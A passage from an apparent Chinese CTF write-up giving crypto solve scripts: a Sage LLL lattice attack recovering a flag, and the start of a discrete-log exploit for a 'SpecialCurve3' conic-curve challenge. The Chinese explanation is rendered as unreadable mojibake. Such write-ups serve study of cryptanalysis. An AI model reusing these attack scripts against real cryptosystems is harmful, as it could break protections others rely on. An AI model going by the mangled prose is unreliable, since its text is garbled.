</span></span></span><span class=line><span class=cl><span class=s1>6.660571276935107790e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.681583443270599219e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.700515409542964562e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.717421256877905762e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.732340393774057929e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.745300469406174670e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.756319058650934721e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.765404381911505425e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.772555468921494821e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.777762178159265432e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.781005372262200126e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.782257385537030814e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.781482768722584069e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.778639205835502253e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.773678481496929180e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.766547414782241958e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.757188729437999655e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.745541865153842309e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.731543734407333659e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.715129401333222177e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.696232624726493441e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.674786187460366591e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.650721936401939729e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.623970470419692447e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.594460419709976122e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.562117241643640000e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.526861416758931682e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.488605883801759546e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.447252539940367342e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.402687687915280321e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.354776457871529374e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.303356463148024886e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.248231231031890047e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.189164222318630664e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.125874450187269531e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.058034773416537746e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.985273843207024811e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.907182434535461653e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.823324532363482149e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.733253130130134423e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.636530294391988036e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.532750701442269019e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.421567579447032585e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.302719786604150158e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.176058598538473916e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.041572643016256734e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.899409301857818377e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.749890824218749685e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.593523418788242338e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.430997787892412703e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.263179996640761260e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.091092256773656004e+02
</span></span></span><span class=line><span class=cl><span class=s1>3.915884105025300528e+02&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=p>[</span><span class=n>each</span><span class=p>[:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span> <span class=k>for</span> <span class=n>each</span> <span class=ow>in</span> <span class=n>b</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>each</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>))</span> <span class=k>for</span> <span class=n>each</span> <span class=ow>in</span> <span class=n>b</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gravity</span><span class=p>(</span><span class=n>n</span><span class=p>,</span><span class=n>d</span><span class=o>=</span><span class=mf>0.25</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>A</span><span class=o>=</span><span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>([</span><span class=n>n</span><span class=p>,</span><span class=n>n</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>]</span><span class=o>=</span><span class=n>d</span><span class=o>/</span><span class=n>n</span><span class=o>*</span><span class=p>(</span><span class=n>d</span><span class=o>**</span><span class=mi>2</span><span class=o>+</span><span class=p>((</span><span class=n>i</span><span class=o>-</span><span class=n>j</span><span class=p>)</span><span class=o>/</span><span class=n>n</span><span class=p>)</span><span class=o>**</span><span class=mi>2</span><span class=p>)</span><span class=o>**</span><span class=p>(</span><span class=o>-</span><span class=mf>1.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>A</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>gravity</span><span class=p>(</span><span class=mi>85</span><span class=p>)</span> <span class=o>*</span> <span class=mi>10</span><span class=o>^</span><span class=mi>18</span>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=p>[[</span><span class=nb>int</span><span class=p>(</span><span class=n>each2</span><span class=p>)</span> <span class=k>for</span> <span class=n>each2</span> <span class=ow>in</span> <span class=n>each1</span><span class=p>]</span> <span class=k>for</span> <span class=n>each1</span> <span class=ow>in</span> <span class=n>A</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>85</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>A</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=mi>84</span> <span class=o>-</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span> <span class=o>+</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>85</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=n>M</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>M</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ans</span> <span class=o>=</span> <span class=n>L</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>ans</span><span class=p>[</span><span class=mi>85</span><span class=p>:]))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=specialcurve3>SpecialCurve3</h2><p>é¢˜ç›®åˆ†æˆäº†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œè¯¥æ›²çº¿æ˜¯è¿‡åŸç‚¹çš„åœ†é”¥æ›²çº¿ï¼Œa>0æ—¶ä¸ºåŒæ›²çº¿ï¼Œa=0æ—¶ä¸ºæŠ›ç‰©çº¿ï¼Œa&lt;0æ—¶ä¸ºæ¤­åœ†ï¼Œä¸‰ä¸ªProblemåˆ†åˆ«å¯¹è¿™ä¸‰ç§æƒ…å†µè¿›è¡Œäº†è®¨è®ºã€‚
æœ€ç®€å•çš„æ˜¯ç¬¬äºŒéƒ¨åˆ†ï¼Œæ ¹æ®åŠ æ³•å…¬å¼ï¼Œè¿™ç§æƒ…å†µä¸‹çš„çºµåæ ‡ä¸ç‚¹çš„æ˜ å°„å…³ç³»æ˜¯çº¿æ€§çš„ï¼Œå³$(nG)_y=2n*G_y$ï¼Œå¯ä»¥ç«‹åˆ»ç®—å‡ºç»“æœ
å…¶æ¬¡æ˜¯ç¬¬ä¸‰éƒ¨åˆ†ï¼Œè™½ç„¶på¾ˆå¤§ï¼Œä½†æ˜¯p+1å…‰æ»‘ï¼Œä¸”æ›²çº¿çš„é˜¶æ˜¯p+1ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨bsgsç®—æ³•ç»“åˆcrtç®—å‡ºç»“æœã€‚è¿™é‡Œä½¿ç”¨äº†sagemathä¸­è‡ªå¸¦çš„bsgsï¼ˆsageè‡ªå¸¦çš„bsgsç®—æ³•æœ‰bugï¼Œæ–‡ä»¶/opt/sagemath-9.3/local/lib/python3.7/site-packages/sage/groups/generic.pyä¸­468è¡Œæ²¡å†™å…¨ï¼Œè¿™å¯¼è‡´bsgsè‡ªå®šä¹‰ç¾¤çš„è®¡ç®—æŠ¥é”™ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯æŠŠè¿™ä¸€è¡Œå‚æ•°è¡¥å…¨å³å¯ã€‚<code>c = op(inverse(b), multiple(a, lb, operation=operation, identity=identity, inverse=inverse, op=op))</code>ï¼‰
ç¬¬ä¸€éƒ¨åˆ†æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘å‚è€ƒäº†å»å¹´D^3CTFçš„åšæ³•ï¼Œæ ¹æ®Pellæ–¹ç¨‹çš„çŸ©é˜µå½¢å¼æ¨å¯¼è¿­ä»£å…¬å¼ï¼Œæœ€ç»ˆå¯ä»¥å°†ç‚¹è¿ç®—æ˜ å°„åˆ°GF(p)ä¸Šçš„è¿ç®—ï¼Œå†æ ¹æ®p-1çš„å°å› å­ï¼Œç»“åˆcado-nfså’Œbsgsç®—æ³•è®¡ç®—å‡ºå…¶ä½™çš„è§£ã€‚è¿™é‡Œçš„æ˜ å°„å…³ç³»è¯¦è§wpï¼Œæ¨å¯¼æ–¹æ³•ä¸D^3ä¸€è‡´ï¼Œåœ¨ç»“æœä¸Šä¼šæœ‰ä¸€ä¸ª$(-1)^n$çš„å·®åˆ«ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæ­£ç€è§£ä¸å‡ºç»“æœå°±å–è´Ÿè§£ã€‚</p><p>expå¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>inverse</span><span class=p>,</span> <span class=n>bytes_to_long</span><span class=p>,</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.groups.generic</span> <span class=kn>import</span> <span class=n>bsgs</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>SpecialCurve</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>p</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>=</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>=</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__str__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s1>&#39;SpecialCurve(</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=si>}</span><span class=s1>,</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=si>}</span><span class=s1>,</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=si>}</span><span class=s1>)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__call__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>SpecialCurvePoint</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__contains__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>other</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=n>other</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=n>other</span><span class=o>.</span><span class=n>y</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>*</span> <span class=n>x</span> <span class=o>**</span> <span class=mi>2</span> <span class=o>-</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>*</span> <span class=n>x</span> <span class=o>-</span> <span class=n>y</span> <span class=o>**</span> <span class=mi>2</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>SpecialCurvePoint</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>p</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>=</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>=</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>x</span> <span class=o>=</span> <span class=n>x</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>y</span> <span class=o>=</span> <span class=n>y</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__str__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;(</span><span class=si>%d</span><span class=s2>, </span><span class=si>%d</span><span class=s2>)&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__repr__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__add__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>P1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>y</span>
</span></span><span class=line><span class=cl>        <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span> <span class=o>=</span> <span class=n>P1</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=n>P1</span><span class=o>.</span><span class=n>y</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>x1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>P1</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>x2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>self</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>x1</span> <span class=o>==</span> <span class=n>x2</span> <span class=ow>and</span> <span class=p>(</span><span class=n>y1</span><span class=o>+</span><span class=n>y2</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>SpecialCurvePoint</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span> <span class=o>==</span> <span class=n>P1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=o>*</span><span class=n>x1</span><span class=o>-</span><span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>)</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=n>y1</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=p>(</span><span class=n>y2</span><span class=o>-</span><span class=n>y1</span><span class=p>)</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=n>x2</span><span class=o>-</span><span class=n>x1</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=n>x3</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=o>*</span><span class=n>inverse</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=o>-</span><span class=n>t</span><span class=o>**</span><span class=mi>2</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=n>y3</span> <span class=o>=</span> <span class=n>x3</span><span class=o>*</span><span class=n>t</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>SpecialCurvePoint</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>,</span> <span class=n>x3</span><span class=p>,</span> <span class=n>y3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__mul__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=n>k</span> <span class=o>&gt;=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>Q</span> <span class=o>=</span> <span class=n>SpecialCurvePoint</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>P</span> <span class=o>=</span> <span class=n>SpecialCurvePoint</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>x</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cnt</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>now</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>k</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k</span> <span class=o>%</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>k</span> <span class=o>-=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=n>Q</span> <span class=o>=</span> <span class=n>P</span> <span class=o>+</span> <span class=n>Q</span>
</span></span><span class=line><span class=cl>                <span class=n>cnt</span> <span class=o>+=</span> <span class=n>now</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>k</span> <span class=o>//=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>                <span class=n>P</span> <span class=o>=</span> <span class=n>P</span> <span class=o>+</span> <span class=n>P</span>
</span></span><span class=line><span class=cl>                <span class=n>now</span> <span class=o>*=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>order</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>is_zero</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>x</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>other</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__eq__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>other</span><span class=p>):</span>
